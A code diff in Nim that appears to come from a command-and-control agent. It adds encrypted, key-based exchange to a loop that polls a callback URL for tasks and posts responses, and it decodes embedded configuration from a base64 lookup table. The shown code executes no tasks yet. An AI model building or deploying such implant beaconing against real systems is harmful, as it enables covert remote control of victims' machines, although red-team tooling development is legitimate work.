@@ -30,26 +30,33 @@ proc rmURLNulls(url: string): string =
       newUrl.add(c)
   return newUrl
 
-#retrieves all of the tasks for the agent  
-proc getTasks(agent: StaticConfig): Task = 
+#retrieves task for the agent and returns the task and senders public key  
+#TODO error handle transport failures, enc failures, b64 failures
+proc getTasks(agent: StaticConfig, privKey: Key): (Task,Key) = 
   let url = urlly.parseUrl(rmURLNulls(agent.callback))
   echo "get task: ", $url
-  let task = fetch($url)
-  echo task 
-  let dec = task.fromFlatty(Task)
-  return dec
+  let b64SerEncSerTask = fetch($url)
+  # unwraps a task structure from the response
+  let (task,senderPubKey) = decodeTask(b64SerEncSerTask,privKey)
+  return (task,senderPubKey)
   
 #posts the task results for the agent
-proc postResult(agent: StaticConfig, taskID: string, taskResult: string): string = 
+proc postResult(agent: StaticConfig, 
+                privKey: Key, 
+                senderPubKey: Key,
+                resp: Resp): string = 
   let url = urlly.parseUrl(rmURLNulls(agent.callback))
 
-  let body = Resp(taskId: taskID, resp: "COMPLETE")
+  #TODO error handle transport failures, enc failures, b64 failures
+  let b64SerEncMsg = encodeResp(resp, privKey, senderPubKey)
+
   echo "post response: ", $url
   let response = post(
       $url,
       @[("Content-Type", "application/json")],
-      toFlatty(body)
+      b64SerEncMsg
   )   
+  return response.body
 
 proc main() =
   let ub64Str = unb64str(LOOKUP_TABLE)
@@ -61,9 +68,10 @@ proc main() =
   echo context.callback
   while(true):
     # try: 
-      let task = getTasks(context)
-      echo task
-      let result = postResult(context, task.taskId,"COMPLETE")
+      let (task,taskerPubKey) = getTasks(context,privKey)
+      let taskId = task.taskId
+      let body = Resp(taskId: taskId, resp: "COMPLETE")
+      let result = postResult(context, privKey, taskerPubKey,body)
       echo result
     # except PuppyError: #TODO add error logging, handling
       echo "error"
